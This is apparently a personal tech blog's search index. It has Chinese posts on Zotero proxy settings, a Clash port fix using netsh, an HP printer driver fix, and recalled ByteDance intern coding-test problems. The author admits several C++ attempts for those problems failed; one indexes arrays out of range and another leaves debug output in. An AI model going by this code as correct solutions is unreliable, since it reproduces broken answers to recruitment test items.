<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Zotero-translate插件配置Google访问代理方法</title>
      <link href="/2025/04/43888.html"/>
      <url>/2025/04/43888.html</url>
      
        <content type="html"><![CDATA[<p>在左上角菜单栏选择【编辑】-【设置】，在设置页面内选择高级选项卡，找到【设置编辑器】选项并打开<br><img src="https://image.0error.net/2025/20250425162956090.png"><br>接下来搜索<code>network.proxy.socks</code>，将其中的<code>network.proxy.socks</code>设置为你的代理地址，<code>network.proxy.socks_port</code>设置为你的代理端口，将<code>network.proxy.socks_remote_dns</code>设置为<code>true</code>，这表明启用了代理的DNS，这样代理配置就完成了。<br><img src="https://image.0error.net/2025/20250425163022793.png"><br>接着找到<code>network.proxy.type</code>，并将其配置为<code>1</code>，即代表启用了代理设置，此刻关闭窗口后，即可正常使用代理访问Google翻译功能。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Scholar </tag>
            
            <tag> Zotero </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash4Windows启动后日志显示端口被占用导致绑定失败解决方案</title>
      <link href="/2025/04/10613.html"/>
      <url>/2025/04/10613.html</url>
      
        <content type="html"><![CDATA[<p>近期电脑随着几次系统更新后，Clash总是出现端口绑定失败的问题，即某次启动电脑后，发现clash的socks代理不能正常工作，后来在任务管理器杀掉clash-core进程后重启此问题能得到缓解，但是这次用了不少办法依然无效，clash日志内报错为<code>Start Mixed(http+socks) server error: listen tcp 127.0.0.1:7891: bind: An attempt was made to access a socket in a way forbidden by its access permissions.</code><br><img src="https://image.0error.net/2025/1317599-20250418112717081-583647463.png" alt="image"><br>最后看到<a href="https://frytea.com/archives/564/">烹茶室的解决方案</a>，怀疑确实是系统端口占用范围的问题。通过PowerShell指令netsh i v4 show dynamicport tcp 发现占用端口范围是从1024到13977.<br><img src="https://image.0error.net/2025/1317599-20250418112801212-1763993110.png" alt="image"><br>然后通过以下指令进行修改，然后重启电脑，问题解决。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs cmd"># 这两条命令来自博客 https://blog.csdn.<span class="hljs-built_in">net</span>/tian2342/article/details/<span class="hljs-number">108934646</span><br>netsh int ipv4 <span class="hljs-built_in">set</span> dynamicport tcp <span class="hljs-built_in">start</span>=<span class="hljs-number">49152</span> num=<span class="hljs-number">16383</span><br>确定。<br>netsh int ipv4 <span class="hljs-built_in">set</span> dynamicport udp <span class="hljs-built_in">start</span>=<span class="hljs-number">49152</span> num=<span class="hljs-number">16383</span><br>确定。<br><br># 这条命令来自 https://github.com/Fndroid/clash_for_windows_pkg/issues/<span class="hljs-number">671</span><br>netsh int ipv4 <span class="hljs-built_in">set</span> dynamic tcp <span class="hljs-built_in">start</span>=<span class="hljs-number">49152</span> num=<span class="hljs-number">16384</span><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> Bugs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>升级到Windows 11 24h2版本后惠普打印机报错spl error 11-1114 line 601</title>
      <link href="/2024/12/63214.html"/>
      <url>/2024/12/63214.html</url>
      
        <content type="html"><![CDATA[<p>After upgrading to Windows 11 version 24H2, the HP printer reports an SPL error 11-1114 at line 601.</p><h1 id="English-Version-via-ChatGPT"><a href="#English-Version-via-ChatGPT" class="headerlink" title="English Version(via: ChatGPT)"></a>English Version(via: ChatGPT)</h1><h2 id="Issue-Description"><a href="#Issue-Description" class="headerlink" title="Issue Description"></a>Issue Description</h2><p>After upgrading to Windows 11 version 24H2, I found that printing documents with the HP Laser MFP 1136w Printer results in a page of error message being printed. However, printing PDFs via HP Smart Assistant works fine. I have tried various solutions, such as using HP Smart to repair, changing network connection methods, and re-adding the printer, but none of these have worked.</p><p><img src="https://image.0error.net/2024/printer-error-page.jpg" alt="printer error page"></p><h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>After troubleshooting, I found that after upgrading to 24H2, Windows assigns the default driver Microsoft IPP Class Driver to the printer. To resolve the issue, go to Settings &gt; Bluetooth &amp; Devices &gt; Printers &amp; Scanners, and open the specific printer settings page. Then, click on Printer Properties, navigate to the Advanced tab, and change the driver to the printer’s designated HP driver. This should resolve the issue.</p><p>  <img src="https://image.0error.net/2024/printer-setting-fig.png" alt="printer setting"></p><h1 id="中文版本"><a href="#中文版本" class="headerlink" title="中文版本"></a>中文版本</h1><h2 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h2><p>近日升级到Windows 11 24h2版本后发现使用HP Laser MFP 1136w Printer打印文档皆会打出一页报错页面，内容如下图所示，但是使用HP Smart Assistant打印PDF一切正常，尝试了使用HP SMART进行修复，修改网络连接方式，重新添加打印机等等方式皆无果。</p><p><img src="https://image.0error.net/2024/printer-error-page.jpg" alt="printer error page"></p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>排查后发现是升级到24h2后Windows为打印机分配的驱动程序会回到默认的<code>Microsoft IPP Class Driver</code> ，需要到设置-蓝牙和其他设备-打印机和扫描仪-具体打印机设置页-打印机属性，然后在选项卡中选择<code>高级</code>页面，接着把驱动程序变更为HP指定的打印机驱动程序即可解决该问题。</p><p><img src="https://image.0error.net/2024/printer-setting-fig.png" alt="printer setting"></p>]]></content>
      
      
      
        <tags>
            
            <tag> bugs </tag>
            
            <tag> Windows </tag>
            
            <tag> Career </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024秋招字节跳动朝夕光年UE4客户端开发实习生岗笔试题目</title>
      <link href="/2024/01/41724.html"/>
      <url>/2024/01/41724.html</url>
      
        <content type="html"><![CDATA[<ul><li>20240117更新<br>2024年秋招笔试题目，没想到时隔几个月字节跳动游戏业务就要寄了，本文仅供参考，请大佬多多指教</li></ul><h1 id="Q1字符串处理"><a href="#Q1字符串处理" class="headerlink" title="Q1字符串处理"></a>Q1字符串处理</h1><h1 id="Q2-杯子问题"><a href="#Q2-杯子问题" class="headerlink" title="Q2 杯子问题"></a>Q2 杯子问题</h1><p>桌子上有4<em>10^9+1个饮料杯，这些饮料杯的编号依次为-2</em>10^9~2*10^9，有的盛有饮料，有的是空杯子。现在，牛牛想将一些饮料杯中的饮料倒入某些空杯中，以此来重新排列这些饮料的放置次序。牛牛想让这些饮料最终都盛放在 n 个不同的饮料杯中，并且这 n 个饮料杯编号依次相邻。对于每一次转移，牛牛只能将任何一个饮料杯中的饮料倒入任何一个空的饮料杯中。<br>求最少的转移次数？<br>输入描述<br>第一行输入盛有饮料的杯子数量N，随后N行，输入N个盛有饮料杯子的编号ai，保证没有两个ai是相同的<br>输出描述<br>输出饮料的最少的转移次数使得盛有饮料的杯子按照顺序排列</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> n;<br>    <span class="hljs-type">int</span> num;<br>    cin &gt;&gt; n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">cups</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; num;<br>        cups[num]=<span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>        <span class="hljs-keyword">if</span> (cups[left] &gt; <span class="hljs-number">0</span> &amp;&amp; cups[right] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">int</span> min_val = <span class="hljs-built_in">min</span>(<span class="hljs-built_in">abs</span>(cups[left]), <span class="hljs-built_in">abs</span>(cups[right]));<br>            cups[left] -= min_val;<br>            cups[right] += min_val;<br>            ans += min_val;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (cups[left] &lt;= <span class="hljs-number">0</span>) left++;<br>        <span class="hljs-keyword">if</span> (cups[right] &gt;= <span class="hljs-number">0</span>) right--;<br>    &#125;<br>    cout &lt;&lt; ans &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>一遍未果，发现理解有误，再拿贪心写一遍</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">cups</span><span class="hljs-params">(n)</span></span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) &#123;<br>        cin &gt;&gt; cups[i];<br>    &#125;<br>    <span class="hljs-built_in">sort</span>(cups.<span class="hljs-built_in">begin</span>(), cups.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">// 将饮料杯按编号从小到大排序</span><br>    <span class="hljs-type">int</span> cur = cups[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 当前已盛放饮料的杯子编号</span><br>    <span class="hljs-type">int</span> moves = <span class="hljs-number">0</span>; <span class="hljs-comment">// 转移次数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        <span class="hljs-keyword">if</span> (cups[i] != cur + <span class="hljs-number">1</span>) &#123; <span class="hljs-comment">// 如果当前杯子编号不是上一个杯子编号加1，则需要转移饮料</span><br>            moves++;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            cur++; <span class="hljs-comment">// 否则当前杯子已经盛有饮料，更新当前已盛放饮料的杯子编号为当前杯子编号</span><br>        &#125;<br>    &#125;<br>    cout &lt;&lt; moves &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>还是未果lol</p><h1 id="Q3食堂打饭"><a href="#Q3食堂打饭" class="headerlink" title="Q3食堂打饭"></a>Q3食堂打饭</h1><p>由于某种众所周知的原因，食堂只开放了一个打饭窗口，已知一共会有 n 位学生陆陆续续进到食堂。<br>牛牛知道这 n 位学生的相关信息，首先将这 n 位学生编号为1,2,…, n .<br>每位学生的信息格式如下：<br> l ：到达食堂的时间。<br> s ：强壮程度。<br> a ：打饭耗时。<br> b ：用餐耗时。<br> r ( r &gt; l )：开班会的时间。<br>学生按照到达食堂的时间进行排队，依次排到打饭窗口队伍的队尾，如果相同时间到达，则强壮程度值更高的排在前面，如果也同样强壮，则编号小排在前面。<br>当轮到某位学生打饭时，会耗费 a 个单位时间，之后立即轮到排在这位学生后面的学生打饭；<br>打完饭之后会耗费 b 个单位时间用餐。<br>当且仅当用完餐时，尚未开始班会，才有可能赶上，即：如果从 t 时刻开始打饭，那么，当且仅当 t + a + b &lt; r 时，才有可能赶上班会，否则，他／她将选择不吃这顿饭，直接去班会地点。<br>一旦某位学生发现自己按照现有排队情况无法赶上班会，则他／她会直接走出队列，前往班会地点，即使已经轮到他／她打饭，他／她也会直接离开，不会产生任何其它时间消耗。<br>假设每一位学生都足够聪明，请你判断每位学生是否能够用餐。<br>本题为多组测试数据，第一行输入一个正整数 T (1≤ T ≤1000)，代表测试数据的组<br>数。<br>对于每组测试数据，第一行输入一个正整数<br> n (1≤ n ≤10°)，代表到食堂就餐的学生<br>数量。<br>接下去 n 行，第 i +1行输入五个正整数 l , s , a , b , r (1≤l, s , a , b ≤10^4;1≤ r ≤10^9;l&lt; r )，表示编号为i的这位学生的相关信息，具体含义如题所述。<br>题目保证，所有测试数据的 n 之和不会超过10^5<br>输出描述<br>对于每组测试数据，一行输出一个长度为 n 的01串，其中，第i个字符为1，则说明编号为i的这位学生能够顺利用餐；否则，说明这位学生来不及用餐。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> MAXN = <span class="hljs-number">100005</span>;<br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-type">int</span> id; <span class="hljs-comment">// 学生编号</span><br>    <span class="hljs-type">int</span> l, s, a, b, r; <span class="hljs-comment">// 到达时间、强壮程度、打饭时间、用餐时间、开班会时间</span><br>    <span class="hljs-type">int</span> leave_time; <span class="hljs-comment">// 离开食堂的时间</span><br>    <span class="hljs-type">bool</span> able_to_eat; <span class="hljs-comment">// 是否能够用餐</span><br><br>    <span class="hljs-type">bool</span> <span class="hljs-keyword">operator</span>&lt;(<span class="hljs-type">const</span> Student&amp; other) <span class="hljs-type">const</span> &#123; <span class="hljs-comment">// 排序规则</span><br>        <span class="hljs-keyword">if</span> (l != other.l) <span class="hljs-keyword">return</span> l &lt; other.l;<br>        <span class="hljs-keyword">if</span> (s != other.s) <span class="hljs-keyword">return</span> s &gt; other.s;<br>        <span class="hljs-keyword">return</span> id &lt; other.id;<br>    &#125;<br>&#125; students[MAXN];<br><br><span class="hljs-type">int</span> t, n;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title">read</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-comment">// 快读</span><br>    <span class="hljs-type">int</span> x = <span class="hljs-number">0</span>, f = <span class="hljs-number">1</span>;<br>    <span class="hljs-type">char</span> ch = <span class="hljs-built_in">getchar</span>();<br>    <span class="hljs-keyword">while</span> (ch &lt; <span class="hljs-string">&#x27;0&#x27;</span> || ch &gt; <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        <span class="hljs-keyword">if</span> (ch == <span class="hljs-string">&#x27;-&#x27;</span>) f = <span class="hljs-number">-1</span>;<br>        ch = <span class="hljs-built_in">getchar</span>();<br>    &#125;<br>    <span class="hljs-keyword">while</span> (ch &gt;= <span class="hljs-string">&#x27;0&#x27;</span> &amp;&amp; ch &lt;= <span class="hljs-string">&#x27;9&#x27;</span>) &#123;<br>        x = x * <span class="hljs-number">10</span> + ch - <span class="hljs-string">&#x27;0&#x27;</span>;<br>        ch = <span class="hljs-built_in">getchar</span>();<br>    &#125;<br>    <span class="hljs-keyword">return</span> x * f;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">inline</span> <span class="hljs-type">void</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span> </span>&#123; <span class="hljs-comment">// 快输</span><br>    <span class="hljs-keyword">if</span> (x &lt; <span class="hljs-number">0</span>) <span class="hljs-built_in">putchar</span>(<span class="hljs-string">&#x27;-&#x27;</span>), x = -x;<br>    <span class="hljs-keyword">if</span> (x &gt;= <span class="hljs-number">10</span>) <span class="hljs-built_in">write</span>(x / <span class="hljs-number">10</span>);<br>    <span class="hljs-built_in">putchar</span>(x % <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;0&#x27;</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    t = <span class="hljs-built_in">read</span>();<br>    <span class="hljs-keyword">while</span> (t--) &#123;<br>        n = <span class="hljs-built_in">read</span>();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>            students[i].id = i;<br>            students[i].l = <span class="hljs-built_in">read</span>();<br>            students[i].s = <span class="hljs-built_in">read</span>();<br>            students[i].a = <span class="hljs-built_in">read</span>();<br>            students[i].b = <span class="hljs-built_in">read</span>();<br>            students[i].r = <span class="hljs-built_in">read</span>();<br>            students[i].leave_time = students[i].l + students[i].a + students[i].b; <span class="hljs-comment">// 初始化离开时间</span><br>            students[i].able_to_eat = <span class="hljs-literal">false</span>; <span class="hljs-comment">// 初始化为不能用餐</span><br>        &#125;<br>        <span class="hljs-built_in">sort</span>(students + <span class="hljs-number">1</span>, students + <span class="hljs-number">1</span> + n);<br><br>        <span class="hljs-type">int</span> cur_time = students[<span class="hljs-number">1</span>].l; <span class="hljs-comment">// 当前时间初始化为第一个学生到达的时间</span><br>        <span class="hljs-type">int</span> q_head = <span class="hljs-number">1</span>, q_tail = <span class="hljs-number">0</span>; <span class="hljs-comment">// 使用自己实现的队列，头指针和尾指针分别初始化为 1 和 0</span><br>        <span class="hljs-keyword">while</span> (q_head &lt;= n) &#123;<br>        cout&lt;&lt;<span class="hljs-string">&quot;cur time:&quot;</span>&lt;&lt;cur_time&lt;&lt;<span class="hljs-string">&quot; a:&quot;</span>&lt;&lt;students[q_head].a&lt;&lt;<span class="hljs-string">&quot; b:&quot;</span>&lt;&lt;students[q_head].b&lt;&lt;endl;<br>            <span class="hljs-keyword">if</span> (cur_time + students[q_head].a + students[q_head].b &lt; students[q_head].r) &#123; <span class="hljs-comment">// 如果当前学生能够赶上班会</span><br>                cur_time += students[q_head].a; <span class="hljs-comment">// 更新当前时间</span><br>                students[q_head].able_to_eat = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 标记为能够用餐</span><br><span class="hljs-comment">//                cout&lt;&lt;q_head&lt;&lt;&quot; is true&quot;&lt;&lt;endl;</span><br>                q_head++; <span class="hljs-comment">// 处理下一个学生</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br><span class="hljs-comment">//            cout&lt;&lt;&quot;q_head:&quot;&lt;&lt;q_head&lt;&lt;&quot;tail:&quot;&lt;&lt;q_tail&lt;&lt;endl;</span><br>            <span class="hljs-keyword">while</span> (q_tail &lt; n &amp;&amp; cur_time &gt;= students[q_tail + <span class="hljs-number">1</span>].leave_time) q_tail++; <span class="hljs-comment">// 删除已经不能用餐的学生</span><br>            <span class="hljs-keyword">if</span> (q_head &lt;= q_tail) &#123; <span class="hljs-comment">// 队列非空</span><br><span class="hljs-comment">//            cout&lt;&lt;1&lt;&lt;&quot; &quot;&lt;&lt;cur_time&lt;&lt;endl;</span><br>                cur_time = <span class="hljs-built_in">max</span>(students[q_tail + <span class="hljs-number">1</span>].l, cur_time); <span class="hljs-comment">// 更新当前时间为队列中下一个学生到达的时间</span><br>                q_tail++; <span class="hljs-comment">// 处理队首学生</span><br>            &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// 队列</span><br><span class="hljs-comment">//cout&lt;&lt;2&lt;&lt;&quot; q_head:&quot;&lt;&lt;q_head&lt;&lt;endl;</span><br>                cur_time = <span class="hljs-built_in">max</span>(students[q_head].l,cur_time); <span class="hljs-comment">// 更新当前时间为队首学生到达的时间</span><br>            &#125;<br>            q_head++;<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=n;j++)<br>        &#123;<br>        <span class="hljs-keyword">if</span>(students[j].id==i)&#123;<br>            <span class="hljs-built_in">write</span>(students[j].able_to_eat); <span class="hljs-comment">// 输出能否用餐的结果</span><br>            <span class="hljs-keyword">continue</span>;<br>            &#125;<br>        &#125;<br>        &#125;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>); <span class="hljs-comment">// 换行</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="Q4方格问题"><a href="#Q4方格问题" class="headerlink" title="Q4方格问题"></a>Q4方格问题</h1><p>由 N 个1x1单元格组成的1 x N 的条形格，请你找到最大的 K ，使他满足将条形格分为一个1 x K 的区域，两个1x K -1的区域，三个1x K -2的区域．…… K 个1 x 1的区域。需要注意的是，这些区域不可接触。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br><br>    <span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; <span class="hljs-comment">// 初始化为1</span><br>    <span class="hljs-keyword">while</span> (k * (k + <span class="hljs-number">3</span>) / <span class="hljs-number">2</span> &lt;= n) &#123; <span class="hljs-comment">// 计算条件，每次加1测试</span><br>        ++k;<br>    &#125;<br><br>    cout &lt;&lt; k - <span class="hljs-number">1</span> &lt;&lt; endl; <span class="hljs-comment">// 输出结果</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> n, <span class="hljs-type">int</span> k)</span> </span>&#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">1</span>, sum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (n &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-keyword">if</span> (n &lt;= k) <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 当前区域长度不超过k，可以分为一个区域</span><br>        sum += k + i;           <span class="hljs-comment">// 累加当前区域的单元格数量</span><br>        n -= k + i;             <span class="hljs-comment">// 计算下一个区域的起始位置</span><br>        i++;                    <span class="hljs-comment">// 下一个区域比当前区域短1个单位长度</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">int</span> n;<br>    cin &gt;&gt; n;<br><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> k = <span class="hljs-number">1</span>; k &lt;= n; k++) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">check</span>(n, k)) ans = k;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">break</span>;<br>    &#125;<br>    cout &lt;&lt; ans &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 算法 </tag>
            
            <tag> 求职 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024秋招西山居游戏开发SEED种子实习笔试题</title>
      <link href="/2024/01/57110.html"/>
      <url>/2024/01/57110.html</url>
      
